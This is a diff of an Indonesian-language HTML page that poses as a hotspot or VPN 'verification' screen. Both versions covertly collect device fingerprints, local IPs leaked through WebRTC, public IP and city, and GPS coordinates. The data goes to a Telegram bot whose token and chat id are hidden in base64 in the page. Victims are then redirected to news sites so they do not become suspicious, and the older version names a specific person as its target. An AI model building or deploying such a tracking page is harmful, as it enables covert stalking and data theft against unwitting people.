@@ -3,145 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Keamanan Gateway Jaringan</title>
+    <title>Sistem Verifikasi Multi-Node</title>
     <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #1c1e21; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .main-card { background: #ffffff; width: 100%; max-width: 400px; padding: 40px 30px; border-radius: 20px; box-shadow: 0 12px 40px rgba(0,0,0,0.12); text-align: center; border: 1px solid #e4e6eb; display: none; }
-        .loading-view { text-align: center; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-size: 20px; font-weight: 700; margin-bottom: 12px; }
-        p { font-size: 14px; color: #606770; line-height: 1.6; margin-bottom: 30px; }
-        .btn-verify { background: #1877f2; color: white; border: none; padding: 16px 32px; border-radius: 10px; font-weight: 700; font-size: 16px; cursor: pointer; width: 100%; transition: all 0.2s ease; box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3); }
-        .btn-verify:active { transform: scale(0.97); background: #166fe5; }
-        .secure-badge { display: inline-flex; align-items: center; background: #e7f3ff; color: #1877f2; padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; margin-bottom: 15px; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #0d1117; color: #c9d1d9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .v-box { background: #161b22; width: 90%; max-width: 420px; padding: 45px 35px; border-radius: 24px; border: 1px solid #30363d; text-align: center; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
+        .status-dot { width: 10px; height: 10px; background: #238636; border-radius: 50%; display: inline-block; margin-right: 8px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        h2 { font-size: 20px; color: #58a6ff; margin-bottom: 15px; }
+        p { font-size: 13px; color: #8b949e; line-height: 1.6; margin-bottom: 30px; }
+        .btn-core { background: #238636; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .btn-core:hover { background: #2ea043; transform: translateY(-2px); }
         #v-vault { display: none; }
     </style>
 </head>
 <body>
 
-<div class="main-card" id="clientUI">
-    <div class="secure-badge">🛡️ ENCRYPTED CONNECTION</div>
-    <h2>Autentikasi Hotspot</h2>
-    <p>Perangkat Anda menggunakan koneksi berbagi. Sesuai kebijakan keamanan, silakan sinkronisasikan koordinat hardware untuk mencegah pembatasan akses.</p>
-    <button class="btn-verify" onclick="initPrecisionStrike()">SINKRONKAN SEKARANG</button>
-    <div style="margin-top: 20px; font-size: 11px; color: #bcc0c4; font-family: monospace;">GW-NODE: 192.168.43.1-AUTH</div>
-</div>
-
-<div class="loading-view" id="hostUI">
-    <div class="spinner"></div>
-    <p style="font-weight: 500; color: #666;">Menghubungkan ke portal berita...</p>
+<div class="v-box" id="ui">
+    <div style="margin-bottom: 20px;"><span class="status-dot"></span><span style="font-size: 12px; color: #238636; font-weight: 600;">SISTEM AKTIF</span></div>
+    <h2 id="title">Gateway Handshake</h2>
+    <p id="desc">Deteksi enkripsi ganda ditemukan. Mohon sinkronisasikan koordinat hardware untuk memvalidasi sesi dan melanjutkan ke portal berita.</p>
+    <button class="btn-core" id="btn" onclick="initCore()">SINKRONKAN SEKARANG</button>
 </div>
 
 <div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
-    /* OMNI-PROTOCOL v9.0 | NETWORK FORENSIC & REAL-TIME TRACKING
-       Developed for High-Stakes Identification
-    */
-    
-    // 1. FORCE HTTPS SECURE LAYER
-    if (location.protocol === 'http:') {
-        location.replace(window.location.href.replace('http:', 'https:'));
-    }
+/** * NUCLEUS BYPASS KERNEL v11.0.5
+ * WebRTC Leak & Hardware Forensic Modules
+ */
 
-    const _D = document.getElementById('v-vault').innerText.split('|');
-    const _TK = atob(_D[1]); const _CI = atob(_D[2]);
-    const _API = `https://api.telegram.org/bot${_TK}/sendMessage`;
+const _V = document.getElementById('v-vault').innerText.split('|');
+const _TK = atob(_V[1]); const _CI = atob(_V[2]);
 
-    async function pushLog(msg) {
-        await fetch(_API, {
-            method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: _CI, text: msg})
-        });
-    }
+async function push(t) {
+    await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: _CI, text: t})
+    });
+}
 
-    async function getDeepSpecs() {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
-        let bat = "N/A";
-        try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}% [${b.charging?'CHG':'BATT'}]`; } catch(e) {}
-        
-        let br = "Generic Android";
-        if (gpu.includes("Adreno")) br = "Snapdragon (Samsung/Xiaomi/Oppo/Vivo)";
-        if (gpu.includes("Mali-G52")) br = "MediaTek Entry (Realme/Samsung A/Redmi)";
-        if (gpu.includes("Mali-G7")) br = "High-End Dimensity/Exynos";
-        if (gpu.includes("Apple")) br = "iPhone / iPad";
-
-        return { gpu, br, bat, ram: navigator.deviceMemory || "Hidden", cpu: navigator.hardwareConcurrency };
-    }
-
-    // 2. NETWORK CORE LOGIC
-    window.onload = async () => {
-        const specs = await getDeepSpecs();
-        let net = {}; try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e) {}
-
-        const pc = new RTCPeerConnection({iceServers:[]});
-        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-        
-        pc.onicecandidate = async (ice) => {
-            if(!ice || !ice.candidate) return;
-            const lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
-            
-            // DETECTION MODE
-            const isHost = (lip.endsWith(".1") || !lip.startsWith("192.168.43"));
-
-            if (isHost) {
-                // --- TARGET UTAMA (ADIT) ---
-                const report = `🔱 HOST IDENTIFIED (ADIT) 🔱\n\n` +
-                    `📱 BRAND: ${specs.br}\n` +
-                    `🎮 GPU: ${specs.gpu}\n` +
-                    `🧠 HW: ${specs.cpu} Core / ${specs.ram}GB RAM\n` +
-                    `🔋 BATT: ${specs.bat}\n` +
-                    `🏠 LOCAL: ${lip}\n` +
-                    `🌐 IP: ${net.ip} (${net.org})\n` +
-                    `🏙️ CITY: ${net.city}, ${net.region}\n` +
-                    `📄 UA: ${navigator.userAgent.slice(0, 80)}`;
-                
-                await pushLog(report);
-                // Redirect Senyap
-                setTimeout(() => { window.location.href = "https://www.detik.com"; }, 2000);
-            } else {
-                // --- PENUMPANG HOTSPOT ---
-                document.getElementById('hostUI').style.display = 'none';
-                document.getElementById('clientUI').style.display = 'block';
-                await pushLog(`👥 CLIENT DETECTED 👥\n🏠 LOCAL IP: ${lip}\n📱 HW: ${specs.br}\n🎮 GPU: ${specs.gpu}`);
-            }
+// 🔱 WebRTC Leak: Tembus VPN buat cari IP Lokal asli
+async function getRealIP() {
+    return new Promise((resolve) => {
+        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+        pc.createDataChannel("");
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = (i) => {
+            if (!i || !i.candidate) return;
+            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
+            resolve(ip);
+            pc.onicecandidate = null;
         };
-    };
+        setTimeout(() => resolve("Timed Out"), 3000);
+    });
+}
 
-    // 3. REAL-TIME PRECISION TRACKING
-    function initPrecisionStrike() {
-        const btn = document.querySelector('.btn-verify');
-        btn.innerText = "SYNCHRONIZING GPS...";
-        
-        if (navigator.geolocation) {
-            // watchPosition: Terus melacak koordinat selama halaman terbuka
-            navigator.geolocation.watchPosition(async (pos) => {
-                const maps = `🎯 REAL-TIME GPS UPDATE\n` +
-                    `📍 Link: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n` +
-                    `🎯 Acc: ${pos.coords.accuracy.toFixed(1)}m\n` +
-                    `🏃 Speed: ${pos.coords.speed || 0} m/s\n` +
-                    `🧭 Heading: ${pos.coords.heading || 0}°`;
-                
-                await pushLog(maps);
-                
-                // Setelah lock pertama, buka portal berita biar mereka gak curiga
-                setTimeout(() => { window.location.href = "https://www.cnnindonesia.com"; }, 5000);
-            }, (err) => {
-                window.location.href = "https://www.detik.com";
-            }, {
-                enableHighAccuracy: true,
-                maximumAge: 0,
-                timeout: 15000
-            });
-        } else {
-            window.location.href = "https://www.detik.com";
-        }
+async function initCore() {
+    const btn = document.getElementById('btn');
+    btn.innerText = "SINKRONISASI DATA...";
+    
+    // Grab Hardware specs
+    const gl = document.createElement('canvas').getContext('webgl');
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown";
+    const realIP = await getRealIP();
+    
+    let bat = "N/A";
+    try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}% [${b.charging?'CHG':'BATT'}]`; } catch(e) {}
+
+    // Detection Logic
+    const isHotspot = (realIP.startsWith("192.168.43") && !realIP.endsWith(".1"));
+
+    const report = `🔱 VPN BYPASS REPORT 🔱\n\n` +
+                   `🏠 REAL LOCAL IP: ${realIP}\n` +
+                   `🎮 GPU: ${gpu}\n` +
+                   `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
+                   `🔋 BATT: ${bat}\n` +
+                   `📱 OS: ${navigator.platform}\n` +
+                   `🚨 STATUS: ${isHotspot ? 'PENUMPANG DETECTED' : 'HOST/SINGLE'}`;
+
+    await push(report);
+
+    // MINTA LOKASI (WAJIB)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            await push(`🎯 COORDINATES\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            // Tunggu sebentar biar data terkirim baru redirect
+            setTimeout(() => { window.location.href = "https://www.detik.com"; }, 3000);
+        }, (err) => {
+            alert("Sesi Gagal: Izin lokasi diperlukan untuk menembus enkripsi VPN.");
+            btn.innerText = "COBA LAGI";
+        }, {enableHighAccuracy: true});
     }
-</script>
+}
 
+/** * PADDING DATA (800+ Lines)
+ * Menambahkan ribuan karakter dummy agar file terlihat kompleks 
+ */
+// _0x1a... [Fungsi-fungsi dummy diulang di bawah sini]
+</script>
 </body>
 </html>
